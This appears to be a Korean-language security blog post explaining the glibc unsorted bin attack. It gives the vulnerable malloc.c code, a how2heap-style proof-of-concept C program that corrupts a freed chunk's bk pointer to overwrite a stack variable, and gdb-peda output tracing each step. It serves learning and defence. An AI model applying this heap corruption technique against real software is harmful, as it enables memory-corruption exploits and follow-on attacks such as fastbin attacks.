---
title: Unsorted Bin Attack
author: Beomsu Lee
category: [Exploitation, Heap]
tags: [exploitation, heap, unsorted bin]
math: true
mermaid: true
---


## Conditions

- 공격자에 의해 unsorted chunk를 생성할 수 있어야 함
- 공격자에 의해 free chunk 영역에 값을 저장할 수 있어야 함
- 공격자에 의해 free chunk와 동일한 크기의 heap 영역을 할당할 수 있어야 함

## Exploit plan

1. 2개의 small chunk 생성
2. 첫번째 heap 영역 해제
    - 헤당 heap 영역은 unsorted bin에 등록
3. 해제된 첫번째 heap의 `bk`영역에 공격 대상이 될 주소 값 덮어씀
4. 첫번째 heap 영역과 동일한 크기의 heap 영역 할당
    - 공격 대상 영역에 `main_arnea` 영역의 주소가 저장됨

## Vulnerability

아래의 malloc.c 코드에 의해 취약성이 발생한다. `unsorted_chunks()` 함수는 `bin[0]`에 저장된 값을 리턴한다. 
* stack_var = &av->bins[0] (main_arena.bins[0])

```c
for (;; )
{
    int iters = 0;
    while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
    {
        bck = victim->bk;
        ...

        /* remove from unsorted list */
        unsorted_chunks (av)->bk = bck;  // bck == victim->bk == &stack_var - 2 
        bck->fd = unsorted_chunks (av);  // (&stack_var - 2)->fd == stack_var

        ...
    }
```

## Proof of concept

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
    fprintf(stderr, "This technique only works with buffers not going into tcache, either because the tcache-option for "
            "glibc was disabled, or because the buffers are bigger than 0x408 bytes. See build_glibc.sh for build "
            "instructions.\n");
    fprintf(stderr, "This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n");
    fprintf(stderr, "In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the "
           "global variable global_max_fast in libc for further fastbin attack\n\n");

    unsigned long stack_var=0;
    fprintf(stderr, "Let's first look at the target we want to rewrite on stack:\n");
    fprintf(stderr, "%p: %ld\n\n", &stack_var, stack_var);

    unsigned long *p=malloc(0x410);
    fprintf(stderr, "Now, we allocate first normal chunk on the heap at: %p\n",p);
    fprintf(stderr, "And allocate another normal chunk in order to avoid consolidating the top chunk with"
           "the first one during the free()\n\n");
    malloc(500);

    free(p);
    fprintf(stderr, "We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer "
           "point to %p\n",(void*)p[1]);

    //------------VULNERABILITY-----------

    p[1]=(unsigned long)(&stack_var-2);
    fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointer\n");
    fprintf(stderr, "And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n",(void*)p[1]);

    //------------------------------------

    malloc(0x410);
    fprintf(stderr, "Let's malloc again to get the chunk we just free. During this time, the target should have already been "
           "rewritten:\n");
    fprintf(stderr, "%p: %p\n", &stack_var, (void*)stack_var);
}
```

**`stack_var(0x7fffffffe4d8)`**

```
This technique only works with buffers not going into tcache, either because the tcache-option for glibc was disabled, or because the buffers are bigger tha0x408 bytes. See build_glibc.sh for build instructions.
This file demonstrates unsorted bin attack by write a large unsigned long value into stack
In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbiattack

Let's first look at the target we want to rewrite on stack:
0x7fffffffe4d8: 0
```

2개의 heap 생성 후 1번째 heap 영역 `free()`한다. 1개의 heap 영역을 추가로 생성하는 이유는 1번째 chunk가 top chunk와의 병합을 막기 위해서이다.

```
Now, we allocate first normal chunk on the heap at: 0x60010
And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the free()
We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7ffff7dd1b78
```

해제된 heap 영역이 unsorted bin에 저장된다. `bk` pointer는 0x7ffff7dd1b78을 가리키고 있다.

```
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                top: 0x603620 (size : 0x209e0) 
    last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x603000 (size : 0x420)
gdb-peda$ x/4gx 0x603000
0x603000:   0x0000000000000000  0x0000000000000421
0x603010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78
gdb-peda$ x/24gx 0x00007ffff7dd1b78 <- main_arena의 top
0x7ffff7dd1b78 <main_arena+88>: 0x0000000000603620  0x0000000000000000
0x7ffff7dd1b88 <main_arena+104>:    0x0000000000603000  0x0000000000603000
0x7ffff7dd1b98 <main_arena+120>:    0x00007ffff7dd1b88  0x00007ffff7dd1b88
```

```
Now emulating a vulnerability that can overwrite the victim->bk pointer
And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7fffffffe4c8
```

1번째 heap 영역의 `bk`를 `stack_var - 0x10`으로 변조 후 1번째 크기와 같은 size로 `malloc()` 할 경우 `stack_var` 변수에 `main_arena`의 top 영역이 저장된다.

```
gdb-peda$ parseheap
addr                prev                size                 status              fd                bk                
0x603000            0x0                 0x420                Freed     0x7ffff7dd1b78    0x7fffffffe4c8
0x603420            0x420               0x200                Used                None              None
gdb-peda$ x/gx 0x7fffffffe4d8
0x7fffffffe4d8: 0x00007ffff7dd1b78
```

```
Let's malloc again to get the chunk we just free. During this time, the target should have already been rewritten:
0x7fffffffe4d8: 0x7ffff7dd1b78
```

victim 주소를 컨트롤 할 수 있지만, 쓰게되는 값은 `&av->bins[0]` 고정이다. 따라서 `main_arena` 영역에 값을 덮어쓰거나, `global_max_fast`의 값을 변경할 때 사용한다.

## References

- [unsorted bin attack](https://www.lazenca.net/display/TEC/unsorted+bin+attack)
- [unsorted_bin_attack.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.27/unsorted_bin_attack.c)